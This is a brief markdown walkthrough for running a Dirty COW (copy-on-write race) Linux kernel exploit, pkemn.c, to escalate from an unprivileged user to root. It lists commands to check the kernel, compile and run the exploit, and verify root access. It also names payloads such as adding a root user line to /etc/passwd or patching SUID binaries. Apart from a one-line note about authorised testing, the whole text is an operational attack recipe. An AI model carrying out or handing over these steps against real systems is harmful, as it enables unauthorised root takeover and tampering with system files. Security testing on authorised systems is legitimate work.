# Linux Kernel Vulnerability — `pkemn.c` (Dirty COW / COW race)

## Summary
- Exploits a **race condition** in the Linux kernel **copy‑on‑write (COW)**.
- Allows an **unprivileged user to write to read‑only memory mappings**.
- Can **modify protected files** (e.g. `/etc/passwd`) and **escalate to root**.
- Local privilege escalation on many **older Linux kernels** (a.k.a. *Dirty COW*).

---

## Minimal Steps

### 1) Check kernel (likely vulnerable if old)
```bash
uname -a
cat /proc/version
```

### 2) Get & compile the exploit
```bash
# assuming pkemn.c is in the current dir
gcc -O2 -pthread -o pkemn pkemn.c
```

### 3) (Optional) Backup target file if attempting passwd overwrite
```bash
cp /etc/passwd /tmp/passwd.bak
```

### 4) Run exploit
```bash
./pkemn
```

### 5) Verify escalation
```bash
id
whoami
```

### 6) (Optional) Restore backup
```bash
[ -f /tmp/passwd.bak ] && sudo cp /tmp/passwd.bak /etc/passwd
```

---

## Notes
- Works by winning a **write‑vs‑COW** race on a read‑only mapping.
- Typical payloads: writing a new root user line to `/etc/passwd` or patching SUID binaries.
- Mitigated in patched kernels; ensure you run this only on systems you’re authorized to test.